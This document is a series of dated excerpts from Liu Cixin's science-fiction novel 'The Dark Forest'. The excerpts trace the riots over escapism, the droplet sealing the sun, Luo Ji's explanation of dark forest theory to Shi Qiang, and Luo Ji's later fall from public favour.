<p>在联合舰队全军覆没后，沉寂了两个世纪的逃亡主义迅速复活。欧洲联合体甚至制定了一个初步的逃亡方案，用全民抽签方式决定首批十万名逃亡人选，这个方案居然在全民投票中被通过了。但在抽签结果出来后，大多数没有抽中的人都反悔了，因此发生了大规模的骚乱，公众转而一致认为逃亡主义是反人类的罪恶。</p>
<p>2016-01-19</p>
<p>当外太空中幸存的战舰之间的黑暗战役发生后，对逃亡主义的指控又有了新的内容：事实证明，当与地球世界的精神纽带剪断后，太空中的人在精神上将会发生彻底的异化，即使逃亡成功，那么幸存下来的也不再是人类文明，而是另一种黑暗邪恶的东西，和三体世界一样，这东西是人类文明的对立面和敌人，它还得到了一个名称——负文明。</p>
<p>2016-01-19</p>
<p>随着水滴向地球的逼近，公众对逃亡主义的敏感也达到了顶峰，舆论警告说很可能有人在水滴攻击地球前出逃。所有太空电梯的基点和航天发射基地周围都有大量的人员在聚集，扬言要关闭所有进入太空的通道。他们确实有这个能力，这个时代全球公民都有拥有武器的自由，民用武器大部分是小型激光枪。一支激光手枪当然不会对太空电梯的运载舱和起飞中的航天器构成威胁，但与传统枪支不同的是，大量的激光枪可以使光束在一个点上聚集，一万支手枪如果同时照射一点，将无坚不摧。聚集在太空电梯基点和航天基地周围的人少则几万，多则上百万，他们中至少有三分之一携带了武器，当发现运载舱上升或航天器起飞时，这些人会不约而同一起拔枪照射，因为激光的直线弹道使瞄准很精确，所以大部分的光束都会聚集在目标上并将其摧毁。在这种情况下，地球与太空的交通联系几乎中断了。</p>
<p>2016-01-19</p>
<p>骚乱在发展，近两天，攻击的目标转向了同步轨道上的太空城。因为网上有大量谣言，说某某太空城正在被改造成逃亡飞船，于是，它们便受到地球民众的集体攻击，不过由于距离遥远，激光束到达时已经发散减弱，加上太空城都处于旋转中，并没有造成实质性伤害。而这项活动已成为末日时代全人类的一项集体娱乐。在当天下午，欧联的三号太空城“新巴黎”同时受到北半球上千万支激光手枪的照射，导致城中的气温急剧上升，不得不疏散居民。这时从太空城中看去，地球比太阳还亮。</p>
<p>2016-01-19</p>
<p>罗辑知道，中心广场就是大低谷纪念碑所在的地方，他和大史曾在躲避被KILLER病毒控制的飞车时去过那里，现在俯视那里，纪念碑和周围的那一小片沙漠都看不见了，整个广场上白花花的一片，那些白色的颗粒蠕动着，像一锅煮着的大米粥。</p>
<p>“那都是人吗？”罗辑疑惑地问。</p>
<p>“裸体的，这是超级性派对，现在人数已过十万，还在增加。”这个时代两性关系和同性关系的发展已远远超出罗辑的想象，对一些事现在也见怪不怪了，不过这个情景还是令他和大史极为震撼，罗辑不由得想起《圣经》中人类接受十诫前的堕落场面，典型的末日景象。</p>
<p>2016-01-19</p>
<p>。与笼罩全球的恐慌不同，科学界是最先从大失败的震撼中恢复理智的，这种分析十分冷静。分析认为，尽管人类目前对水滴的驱动方式和能量来源一无所知，但种种迹象表明，这个装置目前也遇到了能量消耗问题，在完成了对联合舰队的毁灭性打击之后，它朝太阳方向的加速十分缓慢。它曾近距离掠过木星，但对处于木星轨道的三大舰队的基地完全不予理会，而是借用木星的引力进行加速，这一举动更明确地证实了水滴的能量有限且已经过量消耗的猜测。科学家们都认为，有关水滴要撞穿地球的说法是无稽之谈，但它来干什么，谁也不知道。</p>
<p>2016-01-19</p>
<p>为什么？”市长问。</p>
<p>“因为他觉得水滴是来杀他的。”史强说。</p>
<p>“呵呵呵……”市长的笑容很僵硬，显然他很长时间没笑了，“罗辑博士，你是我见过的最自作多情的人。”</p>
<p>2016-01-19</p>
<p>史强停了车，他们都下了车，已接近地平线的夕阳把两个男人的影子长长地投在沙漠上。罗辑感到脚下的大地同他的心一起变软了，他有种在虚弱中站不住的感觉。</p>
<p>罗辑说：“我尽量向人烟稀少的地方开，前面有城市，我要朝那个方向拐，你想办法回去吧，离那方向越远越好。”</p>
<p>“老弟，我就在这儿等你，完事后我们一起回去。”大史说着，从口袋里掏出烟来，在掏打火机的时候他才想起来现在的烟不用点，罗辑注意到，就像他从遥远的过去带来的其他东西一样，他这个习惯动作一直没有改过来。罗辑有些凄惨地笑了笑，他倒是希望史强真这样想，这至少使分别变得稍微容易承受些，“你要愿意就等吧，到时候最好到路基另一边去，我也不知道撞击的威力有多大。”</p>
<p>史强笑着摇摇头，“你让我想起两百多年前遇到的一个知识分子，也是你这熊样儿，一大早坐在王府井教堂前面哭……但他后来挺好的，我苏醒后查了查，活到快一百岁了。”</p>
<p>“你怎么不提那个第一个摸水滴的人呢？丁仪，你好像也认识的。”</p>
<p>“他那是找死，没办法。”大史看着布满晚霞的天空，好像在回忆着物理学家的样子，“不过那真是个大气之人，像那样能把什么事都看开的，我这辈子还只见着他一个，正儿八经的大智慧啊，老弟，你得向他学。”</p>
<p>2016-01-19</p>
<p>还是那句话：你我都是普通人。”罗辑说着看看表，知道时间不能再耽搁了，就向史强伸出手，“大史，谢谢你这两个世纪做过的一切，再见，也许咱们真能在什么地方再见面。”</p>
<p>史强没有去握罗辑的手，把手一摆说：“别扯淡了！老弟，信我的，什么事儿都不会有，走吧，完事后快点来接我，晚上喝酒的时候别怪我笑话你啊。”</p>
<p>2016-01-19</p>
<p>罗辑赶紧转身上车，不想让史强看到他眼中的泪，他坐在车里，努力把后视镜中大史变形的影像刻在心中，然后开动了车子。</p>
<p>也许真能在什么地方再见面，上次跨越了两个世纪的时光，这次要跨越什么呢？罗辑这时突然像两个世纪前的吴岳一样，悔恨自己是个无神论者。</p>
<p>夕阳完全落下去了，路两侧的沙漠在暮色中泛出一片白色，像雪。罗辑突然想起，两个世纪前，他开着那辆雅阁车，带着想象中的爱人，就是沿着这条路出游的，那时华北平原上覆盖着真的雪。他感到她的长发被风吹起，一缕缕撩到他的右面颊上，怪痒痒的。</p>
<p>2016-01-19</p>
<p>不不，别说在哪儿！一知道在哪儿，世界就变得像一张地图那么小了，不知道在哪儿，感觉世界才广阔呢。”</p>
<p>“那咱们就努力迷路吧。”</p>
<p>罗辑一直有一种感觉：庄颜和孩子是被他的想象带到这个世界上来的，想到这里他的心中一阵绞痛，在这个时刻，爱和思念无疑是最折磨人的东西。泪水再次模糊了视线，他努力使自己的大脑一片空白，但庄颜那双美丽的眼睛还是顽强地从空白中浮现，伴着孩子醉人的笑声。罗辑只好把注意力集中到电视新闻上。</p>
<p>2016-01-19</p>
<p>他的人生分成泾渭分明的两部分，成为面壁者后是一部分，这部分人生虽然跨越了两个世纪，但在感觉上紧凑而致密，就像是昨天的一天。他把这部分飞快地倒过去了，因为这部分不像是自己的人生，包括那铭心刻骨的爱情，都像一场转瞬即逝的梦，而他也不敢再想起爱人和孩子了。</p>
<p>与他期望的不同，成为面壁者之前的人生在记忆中也是一片空白，能从记忆之海中捞出来的都是一些碎片，而且越向前，碎片越稀少。他真的上过中学吗？真的上过小学吗？真的有过初恋？支离破碎的记忆中偶尔能找出几道清晰的划痕，他知道有些事情确实发生过，细节历历在目，但感觉已消失得无影无踪了。过去就像攥在手中的一把干沙，自以为攥得很紧，其实早就从指缝中流光了。记忆是一条早已干涸的河流，只在毫无生气的河床中剩下零落的砾石。他的人生就像狗熊掰玉米，得到的同时也在丢弃，最后没剩下多少。</p>
<p>2016-01-19</p>
<p>罗辑看看周围暮色中的大山，想起了两百多年前他在这些山中度过的那个冬夜。这是几亿年间站累了躺了下来的山，“像坐在村头晒太阳的老头儿们。”他想象中的爱人曾这样说。当年遍布田野和城市的华北平原已变成了沙漠，但这些山几乎没有什么变化，仍是那种平淡无奇的形状，枯草和荆条丛仍从灰色的岩缝中顽强地长出来，不比两个世纪前茂盛，但也不比那时稀疏多少。这些岩石山要发生看得出来的变化，两个世纪太短了。</p>
<p>2016-01-19</p>
<p>水滴与地球的相对速度减到零，同时，它把自己调整到太阳同步轨道上，也就是说，在未来的日子里，水滴将始终处于地球与太阳之间，与地球的距离约为四万公里。</p>
<p>2016-01-19</p>
<p>多分钟过去了，什么事情也没有发生，从监测系统中看到，水滴静静地悬浮在太空中，尾部的推进光环已经消失，浑圆的头部正对着太阳，反射着明亮的阳光，前三分之一段像在燃烧。在罗辑的感觉中，水滴与太阳之间似乎在发生着某种神秘的感应。</p>
<p>电视中的图像突然模糊起来，声音也变得嘶哑不清，同时，罗辑感到了周围环境的一些骚动：群鸟从山中惊飞，远处传来狗叫声，不知道是不是错觉，他的皮肤上有轻微的瘙痒感。电视图像和声音在抖动了几下后又清晰起来，后来知道，干扰依然存在，这是全球通讯系统中的抗干扰功能发挥作用，滤除了突然出现的杂波。但新闻对这一事件的反应很迟缓，因为有大量的监测数据需要汇总分析，又过了十多分钟才有了确切信息。</p>
<p>水滴向太阳不间断地发出了强烈电磁波，波的强度超过了太阳的放大阈值，频率则覆盖了能够被太阳放大的所有波段。</p>
<p>2016-01-19</p>
<p>罗辑痴笑起来，直笑得喘不过气。他确实自作多情了，他早该想到这一切：罗辑并不重要，重要的是太阳，从此以后，人类不可能通过太阳这个超级天线向宇宙中发送任何信息了。</p>
<p>水滴是来封死太阳的。</p>
<p>2016-01-19</p>
<p>希恩斯和乔纳森都点点头，希恩斯说：“187J3X1恒星被摧毁了。”</p>
<p>“什么时候？”</p>
<p>“五十一年前，一年前被观测到，但今天下午观测信息才被发现，因为以前人们都没有再注意那颗恒星。舰队联席会议中有几个对局势绝望的人，想从历史中找到些什么，他们想起了面壁计划和您的咒语，于是观测了187J3X1，结果发现它已经不存在了，那个位置只剩一片残骸星云。他们接着调阅恒星扫描观测系统的观测记录，一直追溯到一年前，检索到了187J3X1爆炸时的所有观测数据。”</p>
<p>2016-01-19</p>
<p>而且我们观测到了它被摧毁的过程：一个接近光速的物体击中了187J3X1，那东西体积很小，他们把它叫光粒，它穿过恒星外围气层的那一瞬间才从尾迹被观测到，光粒虽然体积小，但由于十分接近光速，它的质量被相对论效应急剧放大，击中目标时已经达到187J3X1恒星的八分之一，结果立刻摧毁了这颗恒星，187J3X1的四颗行星也在爆炸中被汽化。”</p>
<p>2016-01-19</p>
<p>好的，跟我走。”罗辑说完径直朝沙漠深处走去，大史紧跟着他。他们沉默着走了很长的一段路，穿过了高速公路。</p>
<p>“这是去哪儿？”史强问。</p>
<p>“去最黑的地方。”</p>
<p>两人走到了公路的另一侧，这里，路基挡住了居民区的灯光，四周漆黑一片，罗辑和史强摸索着坐在沙地上。</p>
<p>“我们开始吧。”罗辑的声音在黑暗中响起。“你讲通俗点儿，我这文化水平，复杂了听不懂。”</p>
<p>“谁都能懂，大史，真理是简单的，它就是这种东西，让你听到后奇怪当初自己怎么就发现不了它。你知道数学上的公理吗？”</p>
<p>“在中学几何里学过，就是过两点只能划一根线那类明摆着的东西。”</p>
<p>“对对，现在我们要给宇宙文明找出两条公理：一、生存是文明的第一需要。二、文明不断增长和扩张，但宇宙中的物质总量保持不变。”</p>
<p>“还有呢？”</p>
<p>“没有了。”</p>
<p>“就这么点儿东西能推导出什么来？”</p>
<p>“大史，你能从一颗弹头或一滴血还原整个案情，宇宙社会学也就是要从这两条公理描述出整个银河系文明和宇宙文明的图景。科学就是这么回事，每个体系的基石都很简单。”</p>
<p>“那你推导一下看看？”</p>
<p>“首先我们谈谈黑暗战役的事，如果我说星舰地球是宇宙文明的缩影，你相信吗？”</p>
<p>“不对吧，星舰地球缺少燃料和配件这类资源，但宇宙不缺，宇宙太大了。”</p>
<p>“你错了，宇宙是很大，但生命更大！这就是第二条公理所表明的。宇宙的物质总量基本恒定，但生命却以指数增长！指数是数学中的魔鬼，如果海中有一个肉眼看不到的细菌，半小时分裂一次，只要有足够的养料，几天之内它的后代就能填满地球上所有的海洋。不要让人类和三体世界给你造成错觉，这两个文明是很小，但它们只是处于文明的婴儿阶段，只要文明掌握的技术超过了某个阈值，生命在宇宙中的扩张是很恐怖的。比如说，就按人类目前的航行速度，一百万年后地球文明就可以挤满整个银河系。一百万年，按宇宙尺度只是很短的时间啊。”</p>
<p>“你是说，从长远来看，全宇宙也可能出现星舰地球那样的……他们怎么说来着，生存死局？”</p>
<p>“不用从长远看，现在整个宇宙已经是一个生存死局了！正像希恩斯所说，文明很可能几十亿年前就在宇宙中萌发了，从现在的迹象看，宇宙可能已经被挤满了，谁也不知道银河系和整个宇宙现在还有多少空地方，还有多少没被占用的资源。”</p>
<p>“这也不对吧？宇宙看上去空荡荡的，除了三体，没有看到别的外星生命啊？”</p>
<p>“这是我们下面要说的，给我一支烟。”罗辑摸索了半天才从大史手中拿到烟，再听到罗辑说话时，史强发现他已经坐到离自己有三四米远的地方了，“我们得拉开点距离，才更有太空的感觉。”罗辑说，然后，他拧动香烟的过滤嘴部分，把烟点燃了，同时，史强也点上了一支。黑暗中，两颗小火星遥遥相对。</p>
<p>“好，为了说明问题，现在我们需要建立一个最简洁的宇宙文明模型：这两个火星就代表两个文明星球，整个宇宙只由这两个星球组成，其他什么都没了，你把周围的一切都删除。怎么样，找到这个感觉了吗？”</p>
<p>“嗯，这感觉在这种黑地方比较好找。”</p>
<p>“现在我们分别把这两个文明世界称作你和我的文明，两个世界相距遥远，就算一百光年吧。你探测到了我的存在，但不知道更详细的情况，而我完全不知道你的存在。”</p>
<p>“嗯。”</p>
<p>“下面要定义两个概念：文明间的善意和恶意。善和恶这类字眼放到科学中是不严谨的，所以需要对它们的含义加以限制：善意就是指不主动攻击和消灭其他文明，恶意则相反。”</p>
<p>“这是最低的善意了吧？”</p>
<p>“你已经知道了我这个文明在宇宙中的存在，下面就请考虑你对于我有什么选择。请注意，这个过程中要时刻牢记宇宙文明公理，还要时刻考虑太空中的环境和距离尺度。”</p>
<p>“我选择与你交流？”</p>
<p>“如果这样做，你就要注意自己付出的代价：你暴露了自己的存在。”</p>
<p>“是，这在宇宙中不是一件小事。”</p>
<p>“有各种程度的暴露：最强的暴露是使我得知你在星际的精确坐标，其次是让我知道你的大致方向，最弱的暴露是仅仅让我得知你在宇宙中的存在。但即使是最弱的暴露也有可能使我搜索并找到你，既然你能够探知我的存在，我当然也有可能找到你，从技术发展角度看，这只是个时间问题。”“可老弟，我可以冒一下险与你交流，如果你是恶意的，那算我倒霉；如果你是善意的，那我们就可以进一步交流，最后联合成一个更大的善意文明。”</p>
<p>“好，大史，我们到了关键之处。下面再回到宇宙文明公理上来：即使我是善意文明，我是否能够在交流开始时就判断你也是善意的呢？”</p>
<p>“当然不行，这违反第一条公理。”</p>
<p>“那么，在我收到你的交流信号后，我该怎么办？”</p>
<p>“你当然应该先判断我是善意还是恶意，如果是恶意，你消灭我；如果是善意，我们继续交流。”</p>
<p>罗辑那边的火星升了起来并来回移动，显然是他站起身来开始踱步了，“在地球上是可以的，但在宇宙中不行。下面我们引入一个重要概念：猜疑链。”</p>
<p>“挺怪的词儿。”</p>
<p>“我开始仅得到这么一个词，她没有解释，但我后来终于从字面上推测出了它的含义。”</p>
<p>“他？他是谁？”</p>
<p>“……后面再说吧，我们继续：如果你认为我是善意的，这并不是你感到安全的理由，因为按照第一条公理，善意文明并不能预先把别的文明也想成善意的，所以，你现在还不知道我是怎么认为你的，你不知道我认为你是善意还是恶意；进一步，即使你知道我把你也想象成善意的，我也知道你把我想象成善意的，但我不知道你是怎么想我怎么想你怎么想我的，挺绕的是不是？这才第三层，这个逻辑可以一直向前延伸，没完没了。”</p>
<p>“我懂你的意思。”</p>
<p>“这就是猜疑链，这种东西在地球上是见不到的。人类共同的物种、相近的文化、同处一个相互依存的生态圈、近在咫尺的距离，在这样的环境下，猜疑链只能延伸一至两层就会被交流所消解。但在太空中，猜疑链则可能延伸得很长，在被交流所消解之前，黑暗战役那样的事已经发生了。”</p>
<p>大史抽了一口烟，他沉思的面容在黑暗中显现了一下，“现在看来黑暗战役真的能教会我们好多事。”</p>
<p>“是的，星舰地球的五艘飞船仅仅是五个‘类宇宙文明’，还不是真正的宇宙文明——因为它们都是由人类这同一物种组成的，相互间的距离也很近——尽管这样，在生存死局下，猜疑链还是出现了。而在真正的宇宙文明中，不同种族之间的生物学差异可能达到门甚至界一级，文化上的差异更是不可想象，且相隔着无比遥远的距离，它们之间猜疑链几乎是坚不可摧的。”</p>
<p>2016-01-19</p>
<p>这就是说，不管你我是善意文明还是恶意文明，结果都一样？”</p>
<p>“是的，这就是猜疑链最重要的特性：与文明本身的社会形态和道德取向没有关系，把每个文明看成链条两端的点即可，不管文明在其内部是善意的还是恶意的，在进入猜疑链构成的网络中后都会变成同一种东西。”</p>
<p>“可是如果你比我弱小很多呢，对我没有威胁，这样我总可以和你交流吧？”</p>
<p>“也不行，这就要引入第二个重要概念：技术爆炸。这个概念她也没来得及说明，但推测起来比猜疑链要容易得多。人类文明有五千年历史，地球生命史长达几十亿年，而现代技术是在三百年时间内发展起来的，从宇宙的时间尺度上看，这根本不是什么发展，是爆炸！技术飞跃的可能性是埋藏在每个文明内部的炸药，如果有内部或外部因素点燃了它，轰一下就炸开了！地球是三百年，但没有理由认为宇宙文明中人类是发展最快的，可能其他文明的技术爆炸更为迅猛。我比你弱小，在收到你的交流信息后得知了你的存在，我们之间的猜疑链就也建立了，这期间我随时都可能发生技术爆炸，一下子远远走在你的前面，变得比你强大。要知道在宇宙尺度上，几百年只是弹指一挥间，而我得知你的存在和从交流中得到的信息，很可能是技术爆炸最好的导火线。所以，即使我仅仅是婴儿文明或萌芽文明，对你来说也是充满危险的。”</p>
<p>史强看着远处罗辑那边黑暗中的火星想了几秒钟，又看看自己的烟头，“那我只能保持沉默了。”</p>
<p>“你想想这对吗？”</p>
<p>他们都抽着烟，随着火星不时增亮，两个面容在黑暗中交替浮现，仿佛是这个简洁宇宙中两个深思的上帝。</p>
<p>史强说：“也不行，如果你比我强大，既然我能发现你，那你总有一天能搜寻到我，这样我们之间就又出现了猜疑链；如果你比我弱小，但随时可能发生技术爆炸，那就变成第一种情况了。总结起来：一、让你知道我的存在；二、让你存在下去，对我来说都是危险的，都违反第一条公理。”</p>
<p>“大史，你真的是个头脑很清楚的人。”</p>
<p>“这一开始我的脑瓜还是能跟上你的。”</p>
<p>罗辑在黑暗中沉默了很长时间，他的脸在火星的微光中浮现了两三次后才说：“大史，不是什么开始，我们的推论已经结束了。”</p>
<p>“结束？我们什么也没弄出来呀？你说的宇宙文明图景呢？”</p>
<p>“你在得知我的存在后，交流和沉默都不行，你也只剩一个选择了。”</p>
<p>在长时间的沉默中，两粒火星都熄灭了，没有一丝风，黑暗在寂静中变得如沥青般黏稠，把夜空和沙漠糊成一体。最后，史强只在黑暗中说出一个字：</p>
<p>“操！”</p>
<p>“把你的这种选择外推到千亿颗恒星中的亿万文明上，大图景就出来了。”罗辑在黑暗中点点头说。</p>
<p>“这……也太黑了吧……”</p>
<p>“宇宙就是这么黑。”罗辑伸手挥挥，像抚摸天鹅绒般感受着黑暗的质感，“宇宙就是一座黑暗森林，每个文明都是带枪的猎人，像幽灵般潜行于林间，轻轻拨开挡路的树枝，竭力不让脚步发出一点儿声音，连呼吸都小心翼翼……他必须小心，因为林中到处都有与他一样潜行的猎人。如果他发现了别的生命，不管是不是猎人，不管是天使还是魔鬼，不管是娇嫩的婴儿还是步履蹒跚的老人，也不管是天仙般的少女还是天神般的男孩，能做的只有一件事：开枪消灭之。在这片森林中，他人就是地狱，就是永恒的威胁，任何暴露自己存在的生命都将很快被消灭。这就是宇宙文明的图景，这就是对费米悖论的解释。”</p>
<p>2016-01-19</p>
<p>大史又点上了一支烟，仅仅是为了有点光明。“但黑暗森林中有一个叫人类的傻孩子，生了一堆火并在旁边高喊：我在这儿！我在这儿！”罗辑说。</p>
<p>“有人听到了吗？”</p>
<p>“被听到是肯定的，但并不能由此判断这孩子的位置。到目前为止，人类还没有向宇宙中发送过地球和太阳系位置的确切信息，从已经发送的信息中能够知道的，只是太阳系与三体世界的相对距离，以及这两个世界在银河系中的大致方向，但这两个世界的确切位置还是秘密。要知道，我们处于银河系边缘的蛮荒地带，相对安全一些。”</p>
<p>“那你的咒语是怎么回事呢？”</p>
<p>“我通过太阳发送到宇宙间的那三张图，每张上面有三十个点，代表着三十颗恒星在三维坐标系相应平面的位置投影。把这三张图按照三维立体坐标组合起来，就构成了一个立方体空间，那三十个点分布在这个空间中，标示出了187J3X1与它周围三十颗恒星的相对位置，同时用一个标识符注明了187J3X1。</p>
<p>“你仔细想想就能明白：一个黑暗森林中的猎手，在凝神屏息的潜行中，突然看到前面一棵树被削下一块树皮，露出醒目的白木，在上面用所有猎手都能认出的字标示出森林中的一个位置。这猎手对这个位置会怎么想？肯定不会认为那里有别人为他准备的给养，在所有的其他可能性中，非常大的一种可能就是告诉大家那里有活着的、需要消灭的猎物。标示者的目的并不重要，重要的是黑暗森林的神经已经在生存死局中绷紧到极限，而最容易触动的就是那根最敏感的神经。假设林中有一百万个猎手（在银河系上千亿颗恒星中存在的文明数量可能千百倍于此），可能有九十万个对这个标示不予理会；在剩下的十万个猎手中，可能有九万个对那个位置进行探测，证实其没有生物后也不予理会；那么在最后剩下的一万个猎手中，肯定有人会做出这样的选择：向那个位置开一枪试试，因为对技术发展到某种程度的文明来说，攻击可能比探测省力，也比探测安全，如果那个位置真的什么都没有，自己也没什么损失。现在，这个猎手出现了。”</p>
<p>2016-01-19</p>
<p>“你的咒语再也发不出去了，是吗？”</p>
<p>“是，大史，再也发不出去了。咒语必须向整个银河系广播，而太阳被封死了。”</p>
<p>“人类只晚了一步？”史强扔掉烟头，那粒火星在黑暗中划了一个弧形落下，暂时照亮了一小圈沙地。</p>
<p>“不不，你想想，如果太阳没有被封死，我对三体世界威胁要发出针对它的咒语，会怎么样？”</p>
<p>“你会像雷迪亚兹那样被人群用石头砸死，然后世界会立法绝对禁止别人再有这方面的考虑。”</p>
<p>“说得对，大史，因为太阳系与三体世界的相对距离和在银河系中的大致方向已经公布，暴露三体世界的位置几乎就等于暴露太阳系的位置，这也是同归于尽的战略。也许确实晚了一步，但这是人类不可能迈出的一步。”</p>
<p>“你当时应该直接向三体发出威胁。”</p>
<p>“事情太诡异，当时我没法确定，必须先证实一下，反正时间还多。其实真正的原因在内心深处，我真的没有那个精神力量，我想别人也不会有。”</p>
<p>2016-01-19</p>
<p>我只是想尽责任而已。你说得对，真的是这样，希望我们都不要说出去，但你要说也行，就像她所说的：不管怎样，我都尽了责任。”</p>
<p>“老弟放心，我绝不会说。”</p>
<p>“无论如何，希望已经不存在了。”</p>
<p>2016-01-19</p>
<p>两个人走上路基，来到黑暗稍微淡些的公路上，远方居民区稀疏的灯光刺得他们都眯起了眼。</p>
<p>“还有一件事，你说的那个……他？”罗辑犹豫了一下说：“算了，只需要知道，宇宙文明公理和黑暗森林理论不是我想出来的。”</p>
<p>2016-01-19</p>
<p>出乎罗辑的预料，冬眠移民局承认庄颜和孩子的苏醒仍被冻结着，局长明确告诉他，面壁者的权限在这里不起作用。罗辑找到了希恩斯和乔纳森，他们也不清楚这件事的细节，但告诉他，新修订的面壁法案有一项条款：联合国和面壁计划委员会可以采取一切措施保证面壁者专注于自己的工作。就是说，在两个世纪以后，联合国再一次拿这件事作为要挟和控制他的工具。</p>
<p>2016-01-19</p>
<p>两天后，罗辑参加了面壁计划恢复后的第一次听证会，他没有去处于北美洲地下的联合国总部，而是在新生活五村自己俭朴的居所中，通过视频连接参加了会议，会场画面就出现在房间里的那台普通电视机上。</p>
<p>“面壁者罗辑，我们本来准备面对您的愤怒的。”委员会主席说。</p>
<p>“我的心已是一堆燃烧过后的灰烬，没有愤怒的能力了。”罗辑靠在沙发上懒洋洋地说。</p>
<p>2016-01-19</p>
<p>主席点点头，“这是一种很好的状态，不过委员会认为您应该离开那个小地方，那里不应该成为太阳系防御战争的指挥中心之一。”</p>
<p>2016-01-19</p>
<p>“知道西柏坡吗？离这儿不远，那是一个更小的村庄，两个多世纪前，这个国家的创始人曾在那里指挥过全国的战争，那些战役的规模世界罕见。”</p>
<p>2016-01-19</p>
<p>但雪地工程从来未能全面启动。</p>
<p>两个国际对雪地工程不感兴趣，公众们期待面壁者提出救世战略，而不是一个仅仅能够告知敌人到达的计划，况且他们知道，这不是面壁者的想法，只是联合国和舰队联席会议借助他的权威推行的一个计划而已。而且，与联合国预料的不同，随着水滴编队的逼近，逃亡主义在公众眼中变得更邪恶了。全面启动雪地计划将导致整个太空经济的停滞，因而也会带来地球和舰队经济的全面衰退，两个国际都不愿为此计划付出这样的代价。所以，无论是前往海王星开采油膜物质的太空船队的组建，还是恒星型氢弹的制造（雷迪亚兹的计划所遗留下来的五千多枚氢弹中，在两个世纪后只有不到一千枚还能使用，对于雪地工程而言，这数量远远不够），都进展迟缓。</p>
<p>2016-01-19</p>
<p>罗辑倒是全身心地投入了雪地工程。最初，联合国和舰队联席会议只是想借助他的威信调集工程所需的资源，但罗辑完全把自己陷入工程的细节之中，废寝忘食地同技术委员会的科学家和工程师们搅在一起，对工程提出了自己的许多设想</p>
<p>2016-01-19</p>
<p>例如他提出在每颗核弹上安装小型星际离子发动机，使其能够在轨道上有一定的机动能力，这样可以按照需要及时调整不同区域尘埃云的密度，更重要的是，可以把氢弹作为直接的攻击武器，他把这称为太空地雷。他认为，尽管已经证明恒星型氢弹不可能摧毁水滴，但从长远考虑，却可能用于攻击三体飞船，因为目前没有任何证据证明，敌人的飞船也是用强互作用力材料制造的。他还亲自确定了每一颗氢弹在太阳轨道上的部署位置。虽然从现代技术观点看来，罗辑的许多设想都充满了21世纪的幼稚和无知，但由于他的威望和面壁者的权力，这些意见还是大部分被采纳了。罗辑把雪地工程当做一种逃避的方式，他知道要想逃避现实，最好的方式就是深深介入现实之中。</p>
<p>2016-01-19</p>
<p>但罗辑对雪地工程越是投入，世界就对他越是失望。人们知道，他投身于这个没有多大意义的工程只是为了尽快见到自己的爱人和孩子，而世界所盼望的救世计划一直没有出现，罗辑多次对媒体声称，如果不能以恒星级功率发出咒语，他对一切都无能为力。</p>
<p>2016-01-19</p>
<p>这是一个失望和希望来得一样快的时代，在焦虑地等待了一年半后，公众终于对面壁者罗辑失去了耐心和信心。</p>
<p>2016-01-19</p>
<p>在国际天文学联合会大会上——这个会议上一次引起世界关注是在2006年，那次年会上冥王星被取消了行星的资格——有许多天文学家和天体物理学家认为，187J3X1恒星的爆炸只是一次偶然事件。罗辑作为一名天文学者，很可能在21世纪就发现了该恒星爆发的某些迹象。尽管这种说法有很多漏洞，但还是被越来越多的人相信，这加速了罗辑地位的衰落。他在公众眼中的形象由一个救世主渐渐变成普通人，直至变成大骗子。之后，虽然罗辑还拥有联合国授予的面壁者身份，面壁法案也仍然有效，但他已经没有什么实际权力了。</p>
<p>危机纪年第208年，三体舰队距太阳系2.07光年</p>
<p>2016-01-19</p>
<p>在一个冷雨霏霏的秋天的下午，新生活五区的居民代表会议做出了一个决定：将罗辑驱逐出小区，理由是他影响了该区居民的正常生活。在雪地工程期间，罗辑常常外出参加会议，但大部分时间还是在小区里度过的，他就在自己的居所中同雪地工程的各个机构保持联系。罗辑恢复面壁者身份后，新生活五区就处于戒严之中，居民的生活和工作都受到影响。后来，随着罗辑地位的衰落，对小区的戒严也渐渐松懈下来，但情况更糟：不时有城里来的人聚集在罗辑所住的楼下，对他起哄嘲骂，还向他的窗子扔石块，而新闻媒体对这景象也很感兴趣，往往来的记者和抗议者一样多。但罗辑被驱逐的真正原因，还是冬眠者们心中对他彻底的失望。</p>
<p>2016-01-19</p>
<p>辑再次缓缓点头，然后用因嗓子发炎而嘶哑的声音说：“我明天就走，我是该走了，如果做错了什么事，请大家原谅。”</p>
<p>2016-01-19</p>
<p>两天后，主任才明白他最后那句话的真正含义。</p>
<p>2016-01-19</p>
<p>其实罗辑打算当天晚上就走，目送居委会主任出门后，他摇晃着站起来，到卧室里找了一个旅行袋，往里面装了几件东西，包括从贮藏室里找出的一把短柄铁锹，铁锹柄的三角把手从旅行袋上露了出来。然后，他从地板上拾起一件已经很脏的外套穿上，背起旅行包走出门去，任身后一屋子的信息墙继续闪亮着。</p>
<p>2016-01-19</p>
<p>穿过小区外围的防护林带，他来到沙漠上，细雨洒在脸上，像一双冰凉的小手轻抚着他。沙漠和天空都在暮色中迷蒙一片，像国画中的空白，罗辑想象着这空白中加上自己这个人影的画面，这就是庄颜最后留下的那幅画了。</p>
<p>2016-01-19</p>
<p>这时，一辆车迎面开来，车灯照亮了后座，孩子无意中回头看了一眼，然后盯着罗辑叫道：“呀，他好像是面壁者呀！”于是孩子的父母也都回头看他，他只好承认自己就是罗辑。</p>
<p>这时，车内响起了《山楂树》。</p>
<p>车停了下来，“下去。”孩子的父亲冷冷地说，母亲和孩子看他的眼光也如外面的秋雨般冰凉。</p>
<p>罗辑没有动，他想听那首歌。</p>
<p>“请下去。”那男人又说，罗辑读出了他们目光中的含义：没有救世的能力不是你的错，但给世界以希望后又打碎它则是一种不可饶恕的罪恶。</p>
<p>罗辑只好起身下车，他的旅行包随后被扔了出来，车启动时他跟着跑了几步，想再听听那首歌，但《山楂树》很快就消失在冰冷的雨夜中。</p>
<p>2016-01-19</p>
<p>这里已是旧城边缘，过去的高层建筑群在远方出现，黑乎乎地立在夜雨中，每幢建筑上只零星地亮着几点灯火，像一只只孤独的眼睛。罗辑找到一个公交车站，在避雨处等了近一个小时，才等到一辆开往他要去的方向的无人驾驶公交车。车是半空的，坐了六七个人，看上去也都是旧城的冬眠者居民。车里的人们都不说话，默默地感受着这秋夜的阴郁。一路上很顺利，但一个多小时后还是有人认出了罗辑，于是车里的人一致要求他下车。罗辑争辩说自己已经输入信用点买了票，当然有权坐车。有一个头发花白的老者拿出两枚现在已经很不常见的现金硬币扔给了他，他还是被赶下了车。</p>
<p>“面壁者，你背把铁锹干什么？”车开时有人从车窗探出头问。</p>
<p>“为自己挖墓。”罗辑说，引起了车里的一阵哄笑。</p>
<p>没人知道他说的是真话。</p>
<p>2016-01-19</p>
